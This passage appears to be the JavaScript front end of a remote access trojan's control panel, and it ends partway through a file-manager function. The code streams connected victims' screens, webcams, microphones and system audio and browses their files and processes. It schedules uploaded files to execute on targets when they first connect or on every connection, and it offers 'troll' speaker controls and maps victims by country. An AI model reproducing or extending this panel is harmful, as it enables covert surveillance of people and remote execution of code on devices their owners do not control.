let currentClientId = null;
let screenInterval = null;
let fullscreenInterval = null;
let currentScreenURL = null; // Для URL.createObjectURL
let selectedMonitor = 1;
let selectedCamera = 1;
let selectedMic = 1;
let currentObjectURL = null;
let taskCountdownInterval = null;
let monitoringInterval = null;
let currentFileManagerPath = '';
let selectedSpeaker = null;
let micPlayer = null;
let systemPlayer = null;
let activeOverlays = {}; // { screen: false, camera: false }
let socket = null; // WebSocket connection
let notificationAudio = null;

const LOCALE_TO_COUNTRY = {'AE': 'Arab Emirates', 'AR': 'Argentina', 'AT': 'Austria', 'AU': 'Australia', 'BE': 'Belgium', 'BG': 'Bulgaria', 'BR': 'Brazil', 'BY': 'Belarus', 'CA': 'Canada', 'CH': 'Switzerland', 'CL': 'Chile', 'CN': 'China', 'CO': 'Colombia', 'CZ': 'Czechia', 'DE': 'Germany', 'DK': 'Denmark', 'EE': 'Estonia', 'EG': 'Egypt', 'ES': 'Spain', 'FI': 'Finland', 'FR': 'France', 'GB': 'United Kingdom', 'GR': 'Greece', 'HK': 'Hong Kong', 'HU': 'Hungary', 'ID': 'Indonesia', 'IE': 'Ireland', 'IL': 'Israel', 'IN': 'India', 'IR': 'Iran', 'IT': 'Italy', 'JP': 'Japan', 'KR': 'South Korea', 'KZ': 'Kazakhstan', 'LT': 'Lithuania', 'LV': 'Latvia', 'MX': 'Mexico', 'MY': 'Malaysia', 'NL': 'Netherlands', 'NO': 'Norway', 'NZ': 'New Zealand', 'PE': 'Peru', 'PH': 'Philippines', 'PL': 'Poland', 'PT': 'Portugal', 'RO': 'Romania', 'RS': 'Serbia', 'RU': 'Russia', 'SA': 'Saudi Arabia', 'SE': 'Sweden', 'SG': 'Singapore', 'SK': 'Slovakia', 'TH': 'Thailand', 'TR': 'Turkey', 'TW': 'Taiwan', 'UA': 'Ukraine', 'US': 'USA', 'VN': 'Vietnam', 'ZA': 'South Africa'};

function getCountryFromLocale(localeStr) {
    if (typeof localeStr !== 'string' || !localeStr.includes('-')) return 'Unknown';
    const countryCode = localeStr.split('-').pop().toUpperCase();
    return LOCALE_TO_COUNTRY[countryCode] || 'Other';
}

const idb = {
    db: null,
    init(dbName, storeName) {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(dbName, 1);
            request.onupgradeneeded = () => request.result.createObjectStore(storeName);
            request.onsuccess = () => { this.db = request.result; resolve(); };
            request.onerror = (event) => reject(event.target.error);
        });
    },
    get(storeName, key) {
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(storeName, 'readonly');
            const store = transaction.objectStore(storeName);
            const request = store.get(key);
            request.onsuccess = () => resolve(request.result);
            request.onerror = (event) => reject(event.target.error);
        });
    },
    set(storeName, key, value) {
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(storeName, 'readwrite');
            const store = transaction.objectStore(storeName);
            const request = store.put(value, key);
            request.onsuccess = () => resolve();
            request.onerror = (event) => reject(event.target.error);
        });
    },
    delete(storeName, key) {
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(storeName, 'readwrite');
            const store = transaction.objectStore(storeName);
            const request = store.delete(key);
            request.onsuccess = () => resolve();
            request.onerror = (event) => reject(event.target.error);
        });
    },
};

document.addEventListener('DOMContentLoaded', async () => {
    await idb.init('AdminPanelDB', 'userSettings');

    setupNavigation();
    setupAppearanceControls();
    loadAndApplyAppearance();

    setupStickyCursor();
    applyThemeSettings();

    updateClientsList();
    setInterval(updateClientsList, 5000);
    setupModals();

    setupTaskForm();
    setupFileUploadArea();

    setupRemoteControl();

    initializeSocketAndNotifications();

    notificationAudio = new Audio('/static/audio/notify.wav');

    document.getElementById('searchInput').addEventListener('input', updateClientsList);
    
    // This is a common trick to enable audio playback on user interaction without actually playing a sound.
    const unlockAudioContext = () => {
        if (notificationAudio && notificationAudio.paused) {
            notificationAudio.volume = 0;
            notificationAudio.play().then(() => notificationAudio.pause()).catch(() => {});
            notificationAudio.volume = 1;
        }
        document.removeEventListener('click', unlockAudioContext);
        document.removeEventListener('keydown', unlockAudioContext);
    };
    document.addEventListener('click', unlockAudioContext);
    document.addEventListener('keydown', unlockAudioContext);
/*
    const unlockAudio = () => {
        notificationAudio.play().then(() => notificationAudio.pause()).catch(() => {});
        document.removeEventListener('click', unlockAudio);
        document.removeEventListener('keydown', unlockAudio);
    };
    document.addEventListener('click', unlockAudio);
    document.addEventListener('keydown', unlockAudio);
*/
});

function showStreamOverlay(type) {
    if (activeOverlays[type]) {
        const existingOverlay = document.getElementById(`overlay-${type}`);
        if (existingOverlay) {
            existingOverlay.style.zIndex = (parseInt(existingOverlay.style.zIndex) || 1001) + 1;
        }
        return;
    }

    const sourceImage = document.getElementById(type === 'screen' ? 'screenImage' : 'cameraImage');
    if (!sourceImage || !sourceImage.src || sourceImage.style.display === 'none') {
        alert('Stream is not active.');
        return;
    }

    activeOverlays[type] = true;

    const overlay = document.createElement('div');
    overlay.id = `overlay-${type}`;
    overlay.className = 'stream-overlay';
    overlay.style.zIndex = 1001 + document.querySelectorAll('.stream-overlay').length;

    overlay.innerHTML = `
        <div class="overlay-header">
            <span id="overlayTitle">${type.charAt(0).toUpperCase() + type.slice(1)} - ${currentClientId}</span>
            <button class="overlay-close-btn">&times;</button>
        </div>
        <div class="overlay-content">
            <img id="overlay-img-${type}" class="overlay-image" src="${sourceImage.src}">
        </div>
    `;

    document.body.appendChild(overlay);
    setupStreamOverlayDrag(overlay);

    overlay.querySelector('.overlay-close-btn').onclick = () => {
        overlay.remove();
        activeOverlays[type] = false;
        if (type === 'screen') {
            stopScreenShare();
        } else if (type === 'camera') {
            stopCameraStream();
        }
    };
}

function setupStreamOverlayDrag(overlay) {
    const header = overlay.querySelector('.overlay-header');
    let isDragging = false;
    let offsetX, offsetY;

    header.onmousedown = (e) => {
        isDragging = true;
        offsetX = e.clientX - overlay.offsetLeft;
        offsetY = e.clientY - overlay.offsetTop;
        document.body.style.userSelect = 'none';
        overlay.style.zIndex = 1002 + document.querySelectorAll('.stream-overlay').length;
    };

    document.onmousemove = (e) => {
        if (isDragging) {
            overlay.style.left = `${e.clientX - offsetX}px`;
            overlay.style.top = `${e.clientY - offsetY}px`;
        }
    };

    document.onmouseup = () => {
        isDragging = false;
        document.body.style.userSelect = '';
    };
}

function setupPopoutButtons() {
    document.getElementById('popoutScreenBtn').onclick = () => {
        if (document.getElementById('screenToggle').checked) {
            showStreamOverlay('screen');
        } else {
            alert('Please start the screen stream first.');
        }
    };
    document.getElementById('popoutCameraBtn').onclick = () => {
        if (document.getElementById('cameraToggle').checked) {
            showStreamOverlay('camera');
        } else {
            alert('Please start the camera stream first.');
        }
    };
}

function setupNavigation() {
    document.getElementById('burger-menu').addEventListener('click', () => document.body.classList.toggle('sidebar-open'));
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();

            const currentlyActive = document.querySelector('.nav-link.active');
            if (currentlyActive && currentlyActive.getAttribute('data-target') === 'monitoring-section') {
                stopMonitoring();
            }

            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            document.querySelectorAll('.main-section').forEach(s => s.classList.remove('active'));
            link.classList.add('active');
            const targetId = link.getAttribute('data-target');
            document.getElementById(targetId).classList.add('active');

            if (targetId === 'statistics-section') updateStatistics();
            if (targetId === 'tasks-section') loadTasks();
            if (targetId === 'monitoring-section') startMonitoring();
        });
    });
}

function setupAppearanceControls() {
    document.getElementById('bg-image-input').addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (!file) return;
        try {
            await idb.set('userSettings', 'backgroundImage', file);
            loadAndApplyBackgroundImage();
        } catch (error) {
            console.error("Failed to save background to IndexedDB:", error);
        }
    });

    document.getElementById('reset-bg-button').addEventListener('click', async () => {
        await idb.delete('userSettings', 'backgroundImage');
        loadAndApplyBackgroundImage();
    });

    const backgroundOverlay = document.getElementById('background-overlay');
    document.getElementById('blur-slider').addEventListener('input', (e) => {
        localStorage.setItem('backgroundBlur', e.target.value);
        backgroundOverlay.style.filter = `blur(${e.target.value}px)`;
    });

    document.getElementById('opacity-slider').addEventListener('input', (e) => {
        localStorage.setItem('uiOpacity', e.target.value);
        document.documentElement.style.setProperty('--ui-opacity', e.target.value);
    });
}

async function loadAndApplyBackgroundImage() {
    const backgroundOverlay = document.getElementById('background-overlay');
    const bgFile = await idb.get('userSettings', 'backgroundImage');
    if (currentObjectURL) URL.revokeObjectURL(currentObjectURL);

    if (bgFile) {
        currentObjectURL = URL.createObjectURL(bgFile);
        backgroundOverlay.style.backgroundImage = `url(${currentObjectURL})`;
    } else {
        backgroundOverlay.style.backgroundImage = 'none';
    }
}

async function loadAndApplyAppearance() {
    await loadAndApplyBackgroundImage();

    const savedBlur = localStorage.getItem('backgroundBlur') || '5';
    document.getElementById('background-overlay').style.filter = `blur(${savedBlur}px)`;
    document.getElementById('blur-slider').value = savedBlur;

    const savedOpacity = localStorage.getItem('uiOpacity') || '1';
    document.documentElement.style.setProperty('--ui-opacity', savedOpacity);
    document.getElementById('opacity-slider').value = savedOpacity;
}

function setupStickyCursor() {
    const toggle = document.getElementById('stickyCursorToggle');
    let isEnabled;
    const storedSetting = localStorage.getItem('stickyCursorEnabled');

    if (storedSetting === null) {
        isEnabled = true;
    } else {
        isEnabled = storedSetting !== 'false';
    }

    toggle.checked = isEnabled;
    if (isEnabled) {
        loadStickyCursor();
    } else {
        document.body.style.cursor = 'auto';
    }

    toggle.addEventListener('change', () => {
        if (toggle.checked) {
            localStorage.setItem('stickyCursorEnabled', 'true');
            loadStickyCursor();
        } else {
            localStorage.setItem('stickyCursorEnabled', 'false');
            unloadStickyCursor();
        }
    });
}

function loadStickyCursor() {
    if (document.querySelector('.bubble')) return;
    document.body.style.cursor = 'none';
    const bubble = document.createElement('div');
    bubble.className = 'bubble';
    document.body.appendChild(bubble);

    import('/static/js/sticky_cursor.js')
        .then(module => {
            window.stickyCursor = module.initStickyCursor();
        })
        .catch(err => console.error("Failed to load sticky cursor:", err));
}

function unloadStickyCursor() {
    if (window.stickyCursor && typeof window.stickyCursor.stop === 'function') {
        window.stickyCursor.stop();
    }
    window.stickyCursor = null;
    const bubble = document.querySelector('.bubble');
    if (bubble) bubble.remove();
    const script = document.getElementById('sticky-cursor-script');
    if (script) script.remove();
    document.body.style.cursor = 'auto';
}

function applyThemeSettings() {
    const setTheme = (theme) => document.body.classList.toggle('dark-theme', theme === 'dark' || (theme === 'default' && window.matchMedia('(prefers-color-scheme: dark)').matches));
    const savedTheme = localStorage.getItem('theme') || 'default';
    setTheme(savedTheme);
    document.getElementById(savedTheme).checked = true;
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', () => setTheme(localStorage.getItem('theme') || 'default'));
    document.querySelectorAll('input[name="theme"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            const newTheme = e.target.id;
            localStorage.setItem('theme', newTheme);
            setTheme(newTheme);
        });
    });
}

function initializeSocketAndNotifications() {
    const permissionContainer = document.getElementById('notification-permission-container');
    const enableBtn = document.getElementById('enable-notifications-btn');

    function updateNotificationUI() {
        if (!('Notification' in window)) {
            permissionContainer.innerHTML = '<p style="color: #ff3b30;">This browser does not support desktop notifications.</p>';
            return;
        }

        if (Notification.permission === 'granted') {
            permissionContainer.innerHTML = '<p style="color: #34c759;">Browser notifications are enabled.</p>';
            enableBtn.style.display = 'none';
        } else if (Notification.permission === 'denied') {
            permissionContainer.innerHTML = '<p style="color: #ff3b30;">Notifications are blocked. You need to enable them in your browser settings for this site.</p>';
            enableBtn.style.display = 'none';
        } else {
            permissionContainer.innerHTML = '<p>Click the button to enable notifications.</p>';
            enableBtn.style.display = 'block';
        }
    }

    if (enableBtn) {
        enableBtn.addEventListener('click', () => {
            Notification.requestPermission().then(permission => {
                updateNotificationUI();
            });
        });
    }

    updateNotificationUI();

    socket = io();

    socket.on('new_client_connected', (data) => {
        console.log('New client connected:', data);
        if ("Notification" in window && Notification.permission === "granted") {
            new Notification('New Device Online', { body: `User: ${data.user}\nDevice: ${data.device_info}`, icon: '/static/favicon.ico' }).onclick = () => openClientModal(data.client_id);
        }
        if (notificationAudio) {
            notificationAudio.play().catch(e => console.error("Error playing notification sound:", e));
        }
    });

    // --- Обработчик для стрима экрана ---
    socket.on('screen_chunk', (data) => {
        if (data.client_id !== currentClientId) return;
    
        // Конвертируем base64 в Blob
        const byteCharacters = atob(data.data);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'image/jpeg' });
    
        // Создаем новый URL для Blob
        const newScreenURL = URL.createObjectURL(blob);
    
        // Находим все элементы, где нужно обновить изображение
        const imageElements = [
            document.getElementById('screenImage'),
            document.getElementById('fullscreenImage'),
            document.getElementById(`overlay-img-screen`)
        ].filter(el => el); // Убираем null если элемент не найден
    
        imageElements.forEach(img => {
            const oldURL = img.src;
            img.src = newScreenURL;
            // Освобождаем старый URL только после того, как новый присвоен, чтобы избежать мерцания
            if (oldURL && oldURL.startsWith('blob:')) {
                URL.revokeObjectURL(oldURL);
            }
        });
    
        // Прячем загрузчик, если он был виден
        const screenLoading = document.getElementById('screenLoading');
        if (screenLoading && screenLoading.style.display !== 'none') {
            screenLoading.style.display = 'none';
            document.getElementById('screenImage').style.display = 'block';
        }
    });

    socket.on('camera_chunk', (data) => {
        if (data.client_id !== currentClientId) return;

        const img = document.getElementById('cameraImage');
        const overlayImg = document.getElementById(`overlay-img-camera`);
        const loading = document.getElementById('cameraLoading');
        const newSrc = `data:image/jpeg;base64,${data.data}`;

        if (img && (img.style.display !== 'none' || loading.style.display !== 'none')) {
            loading.style.display = 'none';
            img.style.display = 'block';
            img.src = newSrc;
        }
        if (activeOverlays.camera && overlayImg) {
            overlayImg.src = newSrc;
        }
    });

    socket.on('pcm_audio', (data) => {
        if (micPlayer && micPlayer.isStarted && micPlayer.streamType === 'pcm_audio') {
            micPlayer.addChunk(data);
        }
    });

    socket.on('pcm_system_audio', (data) => {
        if (systemPlayer && systemPlayer.isStarted && systemPlayer.streamType === 'pcm_system_audio') {
            systemPlayer.addChunk(data);
        }
    });
}

function setupModals() {
    const modal = document.getElementById('clientModal');
    const closeButton = document.querySelector('.close');
    
    const closeModal = () => {
        if (!activeOverlays.screen) {
            stopScreenShare();
        }
        if (!activeOverlays.camera) {
            stopCameraStream();
        }
        modal.style.display = 'none';
        micPlayer?.stop();
        systemPlayer?.stop();
    };

    closeButton.onclick = closeModal;
    window.onclick = (event) => {
        if (event.target == modal) closeModal();
        if (event.target == document.getElementById('fullscreenModal')) closeFullscreen();
    };
    document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape') {
            closeFullscreen();
            if (modal.style.display === 'block') closeModal();
        }
    });
}

function setupTaskForm() {
    document.getElementById('createTaskForm').addEventListener('submit', createTask);
    document.getElementById('taskType').addEventListener('change', (e) => {
        const scheduleInput = document.getElementById('taskSchedule');
        if (e.target.value === 'scheduled') {
            scheduleInput.style.display = 'block';
        } else {
            scheduleInput.style.display = 'none';
        }
    });
}

function setupFileUploadArea() {
    const fileInput = document.getElementById('file');
    const fileLabel = document.querySelector('.file-upload-label');
    const selectionArea = document.getElementById('file-selection-area');
    const confirmationArea = document.getElementById('file-confirmation-area');

    if (!fileInput || !fileLabel || !selectionArea || !confirmationArea) {
        console.error("File upload component elements not found.");
        return;
    }

    const confirmFileName = document.getElementById('confirm-file-name');
    const confirmFileSize = document.getElementById('confirm-file-size');
    const cancelBtn = document.getElementById('cancel-upload-btn');
    const confirmBtn = document.getElementById('confirm-upload-btn');

    function showConfirmationView(file) {
        if (!file) return;
        confirmFileName.textContent = file.name;
        confirmFileSize.textContent = formatFileSize(file.size);
        selectionArea.style.display = 'none';
        confirmationArea.style.display = 'flex';
    }

    function showSelectionView() {
        fileInput.value = '';
        selectionArea.style.display = 'block';
        confirmationArea.style.display = 'none';
        document.getElementById('uploadProgressContainer').style.display = 'none';
    }

    fileInput.addEventListener('change', () => {
        if (fileInput.files.length > 0) {
            showConfirmationView(fileInput.files[0]);
        }
    });

    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => fileLabel.addEventListener(eventName, e => { e.preventDefault(); e.stopPropagation(); }, false));
    ['dragenter', 'dragover'].forEach(eventName => fileLabel.addEventListener(eventName, () => fileLabel.classList.add('dragover'), false));
    ['dragleave', 'drop'].forEach(eventName => fileLabel.addEventListener(eventName, () => fileLabel.classList.remove('dragover'), false));

    fileLabel.addEventListener('drop', (e) => {
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            fileInput.files = files;
            showConfirmationView(files[0]);
        }
    }, false);

    cancelBtn.addEventListener('click', showSelectionView);
    confirmBtn.addEventListener('click', () => {
        uploadAndExecuteFile(showSelectionView);
    });
}

function openClientModal(clientId) {
    currentClientId = clientId;
    activeOverlays = { screen: false, camera: false };
    const modal = document.getElementById('clientModal');
    document.getElementById('modalTitle').textContent = 'Control: ' + clientId;
    document.getElementById('deviceInfo').innerHTML = '<p>Loading device info...</p>'; ['monitorSelection', 'cameraSelection', 'micSelection', 'trollAudioDeviceSelect'].forEach(id => {
        const el = document.getElementById(id);
        document.getElementById('screenImage').addEventListener('click', openFullscreen);
        if (el) el.innerHTML = '<div class="device-option">Loading...</div>';
    });
    const defaultTabElement = document.querySelector('.tab');
    openTab('screen', defaultTabElement);
    modal.style.display = 'block';
    loadDeviceInfo(clientId);
    setupPopoutButtons();
    setupTrollControls();
}

function openTab(tabName, element) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
    
    const content = document.getElementById(tabName);
    if (content) content.classList.add('active');
    if (element) element.classList.add('active');

    if (tabName === 'files') {
        requestFileList('');
    }
    if (tabName === 'processes') {
        requestProcessList();
    }
}


async function loadDeviceInfo(clientId) {
    try {
        const response = await fetch('/api/clients');
        const data = await response.json();
        const client = (data.clients || {})[clientId];
        if (!client) throw new Error('Client not found');

        const fullInfo = client.full_info || {};
        const fields = {'System': fullInfo.system, 'User': fullInfo.user, 'Language': fullInfo.language, 'Device Type': fullInfo.device_type, 'Battery': fullInfo.battery_percent ? `${fullInfo.battery_percent}%` : 'N/A', 'Network': fullInfo.network_name, 'IP Address': fullInfo.ip_address, 'HWID': fullInfo.hwid, 'Last Seen': new Date(client.last_seen * 1000).toLocaleString()};
        let infoHtml = '<div class="device-info-grid">' + Object.entries(fields).map(([label, value]) => `<div class="device-info-item"><div class="device-info-label">${label}</div><div class="device-info-value">${value || 'Unknown'}</div></div>`).join('') + '</div>';
        document.getElementById('deviceInfo').innerHTML = infoHtml;

        updateDeviceSelection('monitorSelection', fullInfo.monitors, selectMonitor, 'Monitor');
        updateDeviceSelection('cameraSelection', fullInfo.cameras, selectCamera, 'Camera');
        updateDeviceSelection('micSelection', fullInfo.microphones, selectMic, 'Microphone');
        updateAudioDeviceSelect('trollAudioDeviceSelect', fullInfo.speakers);

        const initialVolume = fullInfo.system_volume !== undefined ? fullInfo.system_volume : 100;
        const volumeSlider = document.getElementById('trollVolumeSlider');
        const volumeLabel = document.getElementById('trollVolumeLabel');
        if (volumeSlider && volumeLabel) {
            volumeSlider.value = initialVolume;
            volumeLabel.textContent = initialVolume;
        }
    } catch (error) {
        console.error('Error loading device info:', error);
        document.getElementById('deviceInfo').innerHTML = '<p>Error loading information.</p>';
    }
}

function updateDeviceSelection(containerId, devices, selectFunction, defaultName) {
    const container = document.getElementById(containerId);
    if (!container) return;
    const deviceList = devices || [];

    if (deviceList.length > 0) {
        container.innerHTML = deviceList.map((dev, index) => {
            const id = dev.Id || dev.id || index;
            const name = dev.Name || dev.name || `${defaultName} ${id}`;
            return `<div class="device-option" onclick="${selectFunction.name}(this)" data-id="${id}">${name}${dev.Primary ? ' (Primary)' : ''}</div>`;
        }).join('');
        if (container.firstChild) selectFunction(container.firstChild);
    } else {
        container.innerHTML = `<div class="device-option">No ${defaultName.toLowerCase()}s found</div>`;
    }
}

function updateAudioDeviceSelect(selectId, devices) {
    const select = document.getElementById(selectId);
    if (!select) return;
    const deviceList = devices || [];

    if (deviceList.length > 0) {
        select.innerHTML = deviceList.map(dev => {
            const id = dev.Id || dev.id;
            const name = dev.Name || dev.name;
            return `<option value="${id}">${name}</option>`;
        }).join('');
    } else {
        select.innerHTML = `<option>No audio devices found</option>`;
    }
}

function updateStatistics() {
    fetch('/api/statistics')
        .then(response => response.ok ? response.json() : Promise.reject('Failed to load stats'))
        .then(data => {
            document.getElementById('stat-online').textContent = data.online_devices;
            document.getElementById('stat-offline').textContent = data.offline_devices;
            document.getElementById('stat-total').textContent = data.total_devices;
            const createStatItems = (dist) => Object.entries(dist).map(([key, count]) => `<div class="stat-item"><span>${key}</span><span>${count}</span></div>`).join('') || '<p>No data</p>';
            document.getElementById('stat-os-dist').innerHTML = createStatItems(data.os_distribution);
            document.getElementById('stat-device-dist').innerHTML = createStatItems(data.device_type_distribution);
            document.getElementById('stat-country-dist').innerHTML = createStatItems(data.country_distribution);

            const mapElement = document.getElementById('clients-map');
            if (mapElement && window.jsVectorMap) {
                mapElement.innerHTML = ''; 

                const countryCounts = data.country_markers || {};
                const maxClients = Math.max(0, ...Object.values(countryCounts));

                const mapData = {};
                for (const code in countryCounts) {
                    mapData[code] = countryCounts[code];
                }

                new jsVectorMap({
                    selector: '#clients-map',
                    map: 'world',
                    backgroundColor: 'transparent',
                    series: {
                        regions: [{
                            values: mapData,
                            scale: ['#e6e6e6', '#0a84ff'], 
                            normalizeFunction: 'polynomial',
                        }]
                    },
                    onRegionTooltipShow(event, tooltip, code) {
                        const count = countryCounts[code] || 0;
                        const countryName = LOCALE_TO_COUNTRY[code.toUpperCase()] || code;
                        tooltip.text(
                            `${countryName}: ${count} client${count !== 1 ? 's' : ''}`,
                            true 
                        );
                    }
                });
            }
        }).catch(error => console.error('Error fetching statistics:', error));
}

async function loadTasks() {
    try {
        const response = await fetch('/api/tasks');
        if (!response.ok) throw new Error('Network response was not ok');
        const tasks = await response.json();
        const taskList = document.getElementById('taskList');
        taskList.innerHTML = '';

        if (tasks.length === 0) {
            taskList.innerHTML = '<p>No tasks scheduled.</p>';
            return;
        }

        tasks.forEach(task => {
            const scheduleDate = new Date(task.schedule_time * 1000);
            const isScheduled = task.type === 'scheduled';
            const isPending = task.status === 'pending' && isScheduled && scheduleDate > new Date();

            let scheduleInfo = '';
            if (isScheduled) {
                scheduleInfo = `Scheduled: ${scheduleDate.toLocaleString()}`;
            } else {
                const typeMap = {
                    'immediate': 'Immediate Execution',
                    'on_first_connect': 'On First Connect',
                    'on_every_connect': 'On Every Connect'
                };
                scheduleInfo = `Trigger: ${typeMap[task.type] || 'Unknown'}`;
            }

            const taskElement = document.createElement('div');
            taskElement.className = 'task-item';
            taskElement.innerHTML = `
                <div class="task-info">
                    <strong>${task.name}</strong>
                    <code>${task.command.startsWith('execute:') ? task.command.split('/').pop() : task.command}</code>
                    <small>Target: ${task.target}</small>
                    <small>${scheduleInfo}</small>
                    ${isPending ? `<div class="task-countdown" data-timestamp="${task.schedule_time}"></div>` : ''}
                </div>
                <div class="task-actions">
                    <span class="task-status ${task.status}">${task.status}</span>
                    <button class="button-delete" onclick="deleteTask('${task.id}')">Delete</button>
                </div>
            `;
            taskList.appendChild(taskElement);
        });
        
        updateTaskCountdowns();
        if (taskCountdownInterval) clearInterval(taskCountdownInterval);
        taskCountdownInterval = setInterval(updateTaskCountdowns, 1000);

    } catch (error) {
        console.error('Failed to load tasks:', error);
        document.getElementById('taskList').innerHTML = '<p style="color: #ff3b30;">Error loading tasks.</p>';
    }
}

function updateTaskCountdowns() {
    document.querySelectorAll('.task-countdown').forEach(el => {
        const scheduleTime = parseInt(el.dataset.timestamp, 10) * 1000;
        const now = new Date().getTime();
        const distance = scheduleTime - now;

        if (distance < 0) {
            el.innerHTML = "Executing...";
            setTimeout(loadTasks, 2000);
            return;
        }

        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);

        el.innerHTML = `Starts in: ${days}d ${hours}h ${minutes}m ${seconds}s`;
    });
}


async function createTask(event) {
    event.preventDefault();
    const formData = new FormData();
    formData.append('name', document.getElementById('taskName').value);
    formData.append('target', document.getElementById('taskTarget').value);
    formData.append('type', document.getElementById('taskType').value);

    const scheduleTime = document.getElementById('taskSchedule').value;
    if (document.getElementById('taskType').value === 'scheduled') {
        if (!scheduleTime) {
            alert("Please select a schedule time for a scheduled task.");
            return;
        }
        formData.append('schedule_time', scheduleTime);
    }

    const file = document.getElementById('taskFile').files[0];

    if (!file) {
        alert("You must select a file for the task.");
        return;
    }

    formData.append('file', file);

    try {
        const uploadResponse = await fetch('/api/upload_task_file', {
            method: 'POST',
            body: formData
        });

        if (!uploadResponse.ok) {
            const error = await uploadResponse.json();
            throw new Error(error.error || 'Failed to upload file');
        }

        const uploadResult = await uploadResponse.json();
        
        const response = await fetch('/api/tasks', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...uploadResult, ...Object.fromEntries(formData.entries()) })
        });

        if (!response.ok) throw new Error((await response.json()).error || 'Failed to create task');

        document.getElementById('createTaskForm').reset();
        document.getElementById('taskSchedule').style.display = 'none';
        loadTasks();
    } catch (error) {
        console.error('Error creating task:', error);
        alert(`Error: ${error.message}`);
    }
}

async function deleteTask(taskId) {
    if (!confirm('Are you sure you want to delete this task?')) return;
    try {
        const response = await fetch(`/api/tasks/${taskId}`, { method: 'DELETE' });
        if (!response.ok) throw new Error('Failed to delete task');
        loadTasks();
    } catch (error) {
        console.error('Error deleting task:', error);
        alert('Could not delete the task.');
    }
}

function formatFileSize(bytes) { if (bytes === 0) return '0 B'; const k = 1024; const sizes = ['B', 'KB', 'MB', 'GB', 'TB']; const i = Math.floor(Math.log(bytes) / Math.log(k)); return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i]; }

function getFileIcon(file) {
    const iconPath = '/static/';
    if (file.is_dir) {
        if (/^[A-Z]:\\?$/.test(file.name)) {
            if (file.name.toUpperCase().startsWith('C')) {
                return `<img src="${iconPath}windows.ico" class="file-icon" alt="Windows Drive">`;
            } else {
                return `<img src="${iconPath}disk.ico" class="file-icon" alt="Disk">`;
            }
        }
        return `<img src="${iconPath}folder.ico" class="file-icon" alt="Folder">`;
    } else {
        const fileNameLower = file.name.toLowerCase();
        if (fileNameLower.endsWith('.exe') || fileNameLower.endsWith('.msi')) {
            return `<img src="${iconPath}program.ico" class="file-icon" alt="Program">`;
        }
        if (['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2'].some(ext => fileNameLower.endsWith(ext))) {
             return `<img src="${iconPath}rar.ico" class="file-icon" alt="Archive">`;
        }
        return '📄';
    }
}

async function requestFileList(path) { if (!currentClientId) return; currentFileManagerPath = path; const fileListBody = document.getElementById('fileListBody'); const pathLabel = document.getElementById('fileManagerPath'); fileListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Loading...</td></tr>'; pathLabel.textContent = `Path: ${path || 'Drives'}`; try { const response = await fetch(`/api/filemanager/list/${currentClientId}?path=${encodeURIComponent(path)}`); if (!response.ok) { const err = await response.json(); throw new Error(err.error || 'Network error'); } const files = await response.json(); updateFileListView(files); } catch (error) { console.error('Error requesting file list:', error); fileListBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">Error: ${error.message}</td></tr>`; } }
function updateFileListView(files) { const fileListBody = document.getElementById('fileListBody'); fileListBody.innerHTML = ''; files.sort((a, b) => { if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1; return a.name.localeCompare(b.name); }); if (currentFileManagerPath) { let parentPath = currentFileManagerPath.replace(/\\/g, '/'); parentPath = parentPath.substring(0, parentPath.lastIndexOf('/')); if (parentPath.endsWith(':')) { parentPath = parentPath.substring(0, parentPath.length); } if (currentFileManagerPath.length > 0 && parentPath.length === 0 && !currentFileManagerPath.endsWith(':/') && !currentFileManagerPath.endsWith(':\\')) { parentPath = ''; } const row = document.createElement('tr'); row.dataset.isDir = "true"; row.innerHTML = `<td title="Go up">⬆️</td><td colspan="4">..</td>`; row.ondblclick = () => requestFileList(parentPath); fileListBody.appendChild(row); } if (files.length === 0 && !currentFileManagerPath) { fileListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Client did not provide a list of drives.</td></tr>'; return; } files.forEach(file => { const row = document.createElement('tr'); row.dataset.fullPath = file.full_path; row.dataset.isDir = file.is_dir;
